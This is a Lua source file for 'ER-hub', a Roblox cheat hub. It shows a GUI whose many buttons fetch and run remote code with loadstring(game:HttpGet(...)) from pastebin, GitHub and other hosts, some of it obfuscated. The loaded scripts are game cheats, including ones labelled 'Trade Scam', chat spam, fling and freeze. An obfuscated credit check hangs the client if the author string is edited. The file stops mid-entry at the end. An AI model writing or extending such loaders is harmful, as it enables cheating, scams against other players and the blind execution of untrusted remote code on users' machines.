--[[
  ⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣤⣤⡀⢀⣀⣠⣀⠀⠀⠀⠀
⠀⠀⠀⣴⠟⠛⠛⠶⣤⣤⡴⠶⢶⣿⣟⣿⣻⣿⡋⠉⠁⠹⣇⠀⠀⠀
⠀⠀⠐⣿⠀⠀⠀⠀⠀⠀⠀⠀⣾⡿⣾⣿⣿⡿⣿⣷⣶⣶⣿⡄⠀⠀
⠀⠀⠀⣿⡖⠀⠀⠀⠀⠀⠀⠀⠘⠿⠷⠿⢿⣽⣷⣿⣿⣯⢿⡟⠀⠀ Scar made this? OH YES HE MADE IT!!.
⠀⠀⢰⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠹⣿⣽⣾⢿⡅⠀⠀  Scar is the guy who wants credits for this? Nope
⠀⠀⣾⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⢀⣨⣧⣀⡀  Thanks for using my codes. ~Los Danones son de calidad.~
⠘⠛⢻⡛⠃⣰⡏⠙⠉⠛⣦⠀⠀⠀⠀⢠⡞⠋⠙⠉⣷⢈⣡⣇⡀⠀
⠀⠰⠾⣿⣳⠋⠀⠀⠀⠀⡿⠀⣞⣿⠆⢸⡄⠀⠀⠀⠈⢷⣽⠋⠉⠀
⠀⠀⢠⡼⣇⠀⠀⠀⣠⡾⠁⠀⠀⠀⠀⠀⠻⣤⣀⠀⠀⢘⡏⠳⠀⠀
⠀⠀⠀⠀⠙⠳⠶⠛⠛⠶⠶⠶⣤⣤⣤⠶⠶⠾⠛⠲⠖⠋⠀⠀
]]

getgenv().d = "Made by Scar"
local d = getgenv().d

--//Services
if not d:lower():find(("racs"):reverse()) then
do return end end

local Danones = setmetatable({}, {
    __index = function(Tipo, Sabor)
        return d:lower():find(("racs"):reverse()) and game:GetService(Sabor) or (function()repeat until not not nil end)()
    end
})

local Empresa = Danones.Workspace

--//Variables
local Camera = Workspace.CurrentCamera

--//Functions
function CrearDanone(Options)
    task.spawn(function()

        Options = Options or {}
        if d:lower() ~= "made by scar" then return "you made me mad so code wont load ^u^" end

        local Danone = {
            Text = Options.Text or "Danones patrocina este espacio",
            Color = Options.Color or Color3.fromRGB(255, 0, 0),
            Duration = Options.Duration or 3,
            Center = Options.Center or true,
            Outline = Options.Outline or true,
            Speed = Options.Speed or 0.5
        }

        local ErDanone = Drawing.new("Text")

        ErDanone.Visible = true 
        ErDanone.Font = 2
        ErDanone.Center = Danone.Center
        ErDanone.Size = 15
        ErDanone.Outline = Danone.Outline 
        ErDanone.Transparency = 1
        ErDanone.Color = Danone.Color
        ErDanone.Text = Danone.Text
        ErDanone.Position = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y)

        for Danone_Number = 0, 10, Danone.Speed do
            task.wait()
            ErDanone.Position = Vector2.new(ErDanone.Position.X, math.clamp(ErDanone.Position.Y - ((Danone.Speed * 10) * Danone_Number), Camera.ViewportSize.Y/2, math.huge))
            ErDanone.Transparency = (Danone_Number - Danone.Speed) /10
            if ErDanone.Position.Y == Camera.ViewportSize.Y/2 and ">~<" and ">^<" then
                ErDanone.Transparency = 1
                break
            end
        end
        task.wait("Please Cheesecakes" and Danone.Duration)
        for Danone_Cachondo = 1, 100 do
            task.wait()
            ErDanone.Transparency = ErDanone.Transparency - 0.01
        end
        ErDanone:Remove()

        return (d:find(("ac"):reverse())and d:sub(9,10)=='Sc' and d=="Made by Scar") and "Er Danone fue vendido" or (function()repeat until not not nil end)()
    end)
end

do (function() return "N...?" end)() end

CrearDanone({
    Speed = 0.1,
    Text = "Hello userThank you for using ER-hub! ",
    Duration = 5,
    Center = true,
    Outline = true,
})

local NotificationBindable = Instance.new("BindableFunction")
   NotificationBindable.OnInvoke = callback
   --
   game.StarterGui:SetCore("SendNotification",  {
    Title = "Script Execution complete";  
    Text = "HELLO";
    Icon = "";
    Duration = 100;
    Button1 = "ty";
    Callback = NotificationBindable;
   })
   
   wait(1)

   local gui = Instance.new("ScreenGui")
local frame = Instance.new("Frame")
local button = Instance.new("TextButton")

gui.Name = "MyGui"
gui.Parent = game.CoreGui

frame.Size = UDim2.new(0.15, 0, 0.15, 0)
frame.Position = UDim2.new(0.425, 0, 0.425, 0)
frame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
frame.BorderColor3 = Color3.fromRGB(255, 255, 255)
frame.BorderSizePixel = 2
frame.BackgroundTransparency = 0.5
frame.Parent = gui

button.Size = UDim2.new(0.7, 0, 0.25, 0)
button.Position = UDim2.new(0.15, 0, 0.375, 0)
button.Text = "ER-hub"
button.TextColor3 = Color3.fromRGB(255, 255, 255)
button.BackgroundColor3 = Color3.fromRGB(90, 150, 200)
button.Font = Enum.Font.GothamBold
button.TextScaled = true
button.Parent = frame


local dragging
local dragInput
local dragStart
local startPos

local function update(input)
    local delta = input.Position - dragStart
    frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = frame.Position

        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

frame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

game:GetService("UserInputService").InputChanged:Connect(function(input)
    if dragging and input == dragInput then
        update(input)
    end
end)

button.MouseButton1Click:Connect(function()
    print("ER-hub")
    local DiscordLib = loadstring(game:HttpGet"https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/discord%20lib.txt")()

   local win = DiscordLib:Window("ER-hub")
   
   local serv = win:Server("Main", "")

   local btns = serv:Channel("Home")
   
   btns:Button("Discord", function()
       loadstring(game:HttpGet(""))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/j3ZdJj5APg", "Copy")
   end)

   local btns = serv:Channel("Player")

   btns:Button("Infinite Jump", function()
    loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Infinite%20Jump.txt"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/j3ZdJj5APg", "Copy")
   end)

btns:Button("ER-JUMP-SPD", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/PBc0fCKf"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/j3ZdJj5APg", "Copy")
   end)

   btns:Button("anti-afk", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/BGT2FsvB"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/j3ZdJj5APg", "Copy")
   end)

   btns:Button("anti-fling", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/Linux6699/DaHubRevival/main/AntiFling.lua'))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/j3ZdJj5APg", "Copy")
   end)

   local btns = serv:Channel("Premier")

   btns:Button("ER-hub-Premier", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ebihura1/ER-Premier/refs/heads/main/obf_6JEJK5928p9psHdYe5EW1WcKH6X388kVfm8o5mG0C11Nn8tpFWHkN54emPkjJTki.lua"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/j3ZdJj5APg", "Copy")
   end)

   local btns = serv:Channel("mobile:物人でおすすめ")

   btns:Button("BlizTBr", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/BlizTBr/scripts/main/FTAP.lua"))() 
   DiscordLib:Notification("Discord Link", "https://discord.gg/j3ZdJj5APg", "Copy")
   end)
   
   btns:Button("freeze", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/creepstu/fuzzy-octo-giggle/main/Source'))() 
   DiscordLib:Notification("Discord Link", "https://discord.gg/j3ZdJj5APg", "Copy")
   end)

   btns:Button("SystemBroken", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/script"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/j3ZdJj5APg", "Copy")
   end)

   btns:Button("VFly", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/tomoneko2222/vfly/main/1"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/j3ZdJj5APg", "Copy")
   end)

   btns:Button("coordinate", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/puvsqCq4"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/j3ZdJj5APg", "Copy")
   end)

   btns:Button("IY", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/j3ZdJj5APg", "Copy")
end)

btns:Button("簡単キャラクターリセットmobile&iPad勢おすすめ", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/U7pwTmFR"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/j3ZdJj5APg", "Copy")
end)

btns:Button("上のScript全て同時起動", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/LEtL9c6f"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/j3ZdJj5APg", "Copy")
end)

local btns = serv:Channel("pc:物人おすすめ")

btns:Button("BlizTBr", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/BlizTBr/scripts/main/FTAP.lua"))() 
   DiscordLib:Notification("Discord Link", "https://discord.gg/j3ZdJj5APg", "Copy")
   end)
   
   btns:Button("freeze", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/creepstu/fuzzy-octo-giggle/main/Source'))() 
   DiscordLib:Notification("Discord Link", "https://discord.gg/j3ZdJj5APg", "Copy")
   end)

   btns:Button("SystemBroken", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/script"))() 
   DiscordLib:Notification("Discord Link", "https://discord.gg/j3ZdJj5APg", "Copy")
   end)

   btns:Button("VFly", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/tomoneko2222/vfly/main/1"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/j3ZdJj5APg", "Copy")
   end)

   btns:Button("coordinate", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/puvsqCq4"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/j3ZdJj5APg", "Copy")
   end)

   btns:Button("IY", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/j3ZdJj5APg", "Copy")
end)

btns:Button("VHS", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/fgdergewrgegr/SVH/main/VHSV4"))()
   DiscordLib:Notification("Discord Link", "hhttps://discord.gg/j3ZdJj5APg", "Copy")
   end)

   btns:Button("上のScript全て同時起動", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/iTEdj3QJ"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/j3ZdJj5APg", "Copy")
end)

local btns = serv:Channel("そうやねんScript")

btns:Button("簡単キャラクターリセットmobile&iPad勢おすすめ", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/U7pwTmFR"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/j3ZdJj5APg", "Copy")
end)

btns:Button("家にtpリスキルなどから逃げれる", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/y4sAYRjB"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/j3ZdJj5APg", "Copy")
end)

btns:Button("FTAP chat spam", function()
    loadstring(game:HttpGet(('https://pastefy.app/Lgm9dpZc/raw'),true))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/j3ZdJj5APg", "Copy")
end)

   local serv = win:Server("Game Script", "")

   local btns = serv:Channel("Fling things and people")

   btns:Button("BlizTBr", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/BlizTBr/scripts/main/FTAP.lua"))() 
   DiscordLib:Notification("Discord Link", "https://discord.gg/j3ZdJj5APg", "Copy")
   end)

   btns:Button("verbal", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/JEHNL5kP",true))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/j3ZdJj5APg", "Copy")
   end)

   btns:Button("Elysium-Hub", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Natural-Disaster-Survival-Blackhole-9395"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/j3ZdJj5APg", "Copy")
   end)

   btns:Button("blackhole", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Oxwoey/ElysiumHub/main/oxwoey.lua", true))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/j3ZdJj5APg", "Copy")
   end)

   btns:Button("VHS", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/fgdergewrgegr/SVH/main/VHSV4"))()
   DiscordLib:Notification("Discord Link", "hhttps://discord.gg/j3ZdJj5APg", "Copy")
   end)

   local btns = serv:Channel("Blox fruits")

   btns:Button("Strawberry hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/CheemsNhuchiAl/Sotringhuhu/main/StrawberryHubBeta1.35"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
   end)

   btns:Button("Mama HUB", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/MAMAhub1/Mmahub/main/README.md"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
   end)

   btns:Button("REDz HUB", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/PetSimulator99/main/redz9999.lua"))() 
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
   end)

   btns:Button("Min New hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaCrack/Min/main/MinGamingEng"))() 
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
   end)

   btns:Button("Youm Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Jadelly261/BloxFruits/main/YoumHub", true))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
   end)

   btns:Button("Demon Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/farrelghibran/demon/main/source.app"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
   end)

   btns:Button("Astral Hub", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/Augustzyzx/A-s-t-r-a-l/main/BF.html'))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
   end)

   btns:Button("YTB Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/KhanhTranVan/Guest/main/thankforbuying"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
   end)

   btns:Button("Kind Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Jadelly261/BloxFruits/main/KindHub"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
   end)

   local btns = serv:Channel("Pet Simulator 99")

   btns:Button("REDz HUB", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/PetSimulator99/main/redz9999.lua"))() 
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
   end)

   btns:Button("zap hub", function()
    loadstring(game:HttpGet('https://www.zaphub.xyz/Exec'))() 
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
   end)

   btns:Button("FREEHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FreeeScripts/FREEHub/main/Loader", true))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
   end)

   local btns = serv:Channel("Murder Mystery 2")

   btns:Button("master", function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/MarsQQ/ScriptHubScripts/master/MM2%20Admin%20Panel'),true))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
   end)

   btns:Button("Au0yX", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Au0yX/Community/main/XhubMM2"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
   end)

   btns:Button("R3TH-PRIV", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/R3TH-PRIV/R3THPRIV/main/loader.lua'))() 
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
   end)

   btns:Button("ProstoHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/testikwatafak/-ProstoHub/main/ProstoHub", true))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
   end)

   btns:Button("Ez-Industries", function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/debug42O/Ez-Industries-Launcher-Data/master/Launcher.lua'),true))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
   end)

   btns:Button("king", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/eggs/main/MM2"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
   end)

   btns:Button("ToraScrip", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/ToraScript/Script/main/mm2'))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
   end)

   btns:Button("Bac0nHck", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Bac0nHck/Scripts/main/MM2SpraySize"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

local btns = serv:Channel("Maple Hospital")

btns:Button("Amity", function()
    loadstring(game.HttpGet(game,"https://raw.githubusercontent.com/78n/Amity/main/Maple.lua"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

local btns = serv:Channel("Evade")

btns:Button("thaibao", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHubEvade'))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("xdevslasher", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/xdevslasher/xyz.evade/main/xyz.evade.lua",true))() 
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("FREEHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FreeeScripts/FREEHub/main/Loader", true))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("Lazium", function()
    loadstring(game:HttpGet"https://raw.githubusercontent.com/CheapeeWastaken/Lazium/main/TheMain")()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("Hydro hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FRX397/Hydrohub/main/Hydro_hub", true))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("Can Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/stuffman0001/CanHub/main/Code"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("immper", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/Jimmper/Robloxscripts/main/obf_ijyV31z27684kpX3UZru9jXcm6UcjCbQyA8el5xmOsYPJ1wwwym70XBni5NRkAAu.lua'))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

local btns = serv:Channel("DOORS")

btns:Button("KeoneGit-hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/KeoneGithub/KeoneGithub/main/Doors",true))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("entity-spawner", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/althan99/doors-entity-spawner/main/Script"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("-FFJ-Hub", function()
    loadstring(game:HttpGet('https://rawscripts.net/raw/DOORS-FFJ-Hub-11365'))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("DarkDoo", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/DarkDoorsKing/Doors/main/Main"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

local btns = serv:Channel("Natural Disaster")

btns:Button("Rawn", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/LiverMods/Rawnder-NTDR/main/NaturalDisaster'))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("hussain", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/hussain1323232234/My-Scripts/main/Natural%20Disaster'))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("SIX-HUB", function()
    loadstring(game:HttpGet"https://raw.githubusercontent.com/ySixxNz/Natural-Desastre/SIX-MENU/SIX-HUB-NATURAL-DESASTRE")()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("PlayerHubOther", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/JustAP1ayer/PlayerHubOther/main/PlayerHubLoader.lua"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("CH-Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/RobloxHackingProject/CHHub/main/CHHub.lua"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

local btns = serv:Channel("Toilet towe")

btns:Button("Trade Scam", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/c3cSPAiZ"))() 
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("Nicuse", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Nicuse/RobloxScripts/main/TowerDefenseSimulator.lua",true))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("Nicuse", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Nicuse/RobloxScripts/main/TowerDefenseSimulator.lua",true))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

local btns = serv:Channel("Blade Ball")

btns:Button("Aqui-mesm", function()
    loadstring(game:HttpGet(("https://raw.githubusercontent.com/Kozukiremboukk/Aqui-mesml/main/blades")))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("bakahub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/BakaIsNoname/Releases_bladeball_bakahub/main/Blade"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("REDz-HUB", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/BladeBall/main/eng"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("Pitbull-Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/SoyAdriYT/PitbullHub/main/Scripting", true))() 
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

local btns = serv:Channel("Skywars")

btns:Button("OwlHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))();
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("ScriptHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Nadir3709/ScriptHub/main/KeySystem"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("Emoli5y", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/Emoli5y/shadow/main/Main'))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

local btns = serv:Channel("The strongest battlefield")

btns:Button("gojou", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Doumaix/qqwrxxxx/main/gojo_v2.4.lua"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("sukuna", function()
    loadstring(game:HttpGet"https://raw.githubusercontent.com/h8h88/hubfr/main/hubfr")()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("BadWare-Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/sandwichk/RobloxScripts/main/Scripts/BadWare/Hub/Load.lua", true))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("TSBobfuscator", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripterbacon/TSBobfuscator/main/Main.Lua"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

local btns = serv:Channel("Arsenal")

btns:Button("QPScript", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/QPScript/Script/main/Arsenal.txt"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("FREEHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FreeeScripts/FREEHub/main/Loader", true))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("thaibao", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/thaibao/main/ArsenalTbaoHubNew"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("hub", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/8ysy7ENG",true))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

local btns = serv:Channel("Rival")

btns:Button("venoxrivals2", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/venoxhh/universalscripts/main/rivals/venoxrivalsv2'))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("venoxrivals", function()
    loadstring(game:HttpGet(("https://raw.githubusercontent.com/venoxhh/universalscripts/main/rivals/venoxrivals")))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("thaibao", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHubRivals"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("RivalsUPD2", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Sheeshablee73/Scriptss/main/RivalsUPD2.lua"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("VapeV4", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("Actyrn", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Actyrn/Scripts/main/AzureModded"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

local btns = serv:Channel("Slap Battle")

btns:Button("tor", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/ToraScript/Script/main/Tongue'))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("GFET", function()
    loadstring(game:HttpGet(("https://raw.githubusercontent.com/Latundra/GFET/main/script")))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("KykyryzoB-Hub", function()
    loadstring(game:HttpGet('https://rawscripts.net/raw/Slap-Battles-KykyryzoB-Hub-SB-9008'))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("RSZ-Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TheScriptMaster1/RSZ-Hub/main/loadstring.lua"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

local btns = serv:Channel("Driving Empire ")

btns:Button("Lightux", function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/cool83birdcarfly02six/Lightux/main/README.md'),true))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("DrivingEmpire", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/DrivingEmpire.lua"))()
   DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
end)

btns:Button("SSSWWW222", function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/zeuise0002/SSSWWW222/main/README.md'),true))()
       DiscordLib:Notification("Discord Link", "https://discord.gg/paZRwy2zhN", "Copy")
    end)

local btns = serv:Channel("Build A Boat For Treasure")

btns:Button("BUILD", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/XRoLLu/UWU/main/BUILD%20A%20BOAT%20FOR%20TREASURE.lua'))()
